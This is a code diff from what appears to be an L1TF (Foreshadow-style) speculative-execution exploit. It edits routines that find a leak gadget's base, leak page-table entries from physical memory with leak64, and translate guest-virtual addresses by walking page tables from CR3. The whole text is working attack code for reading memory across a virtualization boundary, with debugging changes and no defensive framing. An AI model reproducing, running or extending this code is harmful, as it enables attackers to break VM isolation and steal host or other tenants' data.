@@ -1,12 +1,13 @@
+#include <stdlib.h>
+#include <string.h>
 #include "leak.h"
 #include "l1tf.h"
 
 hpa_t gadget_base(void)
 {
-#if LEAK == SKIP && defined(BASE)
+#if defined(BASE)
+	dump(BASE);
         return BASE;
-#elif LEAK == CHEAT
-        return hc_phys_map_base();
 #endif
         return l1tf_find_base();
 }
@@ -44,16 +45,21 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 	do {
 		for (int i = 0; i < 7; i++)
 			pte = leak64(base, pa);
-		if (++count % 1000 == 0)
-			printf("WARNING: leak_pte stuck for %d cycles\n", count);
-	} while (!((pte & 0x3ULL) == 0x3));
+		if (++count % 1000 == 0) {
+			printf("WARNING: leak_pte stuck for %d cycles; pte = %lx\n", count, pte);
+			if (!(pte & 1)) {
+				print_page_table(base, pa & ~0xfff);
+			}
+			exit(1);
+		}
+	} while (!(pte & 1));
 	return pte;
 }
 
 hpa_t translate_va(hpa_t base, hva_t va, hpa_t cr3)
 {
 	const int verbose = 0;
-	if (verbose >= 2) printf("translate_va(base=%lx, va=%lx, cr3=%lx)\n", base, va, cr3);
+	if (verbose >= 2) printf("\ttranslate_va(base=%lx, va=%lx, cr3=%lx)\n", base, va, cr3);
 	hpa_t pgd_pa = cr3 + 8 * BITS(va, 48, 39);
 	if (verbose >= 2) dumpp(pgd_pa);
 	pte_t pgd = leak_pte(base, pgd_pa);
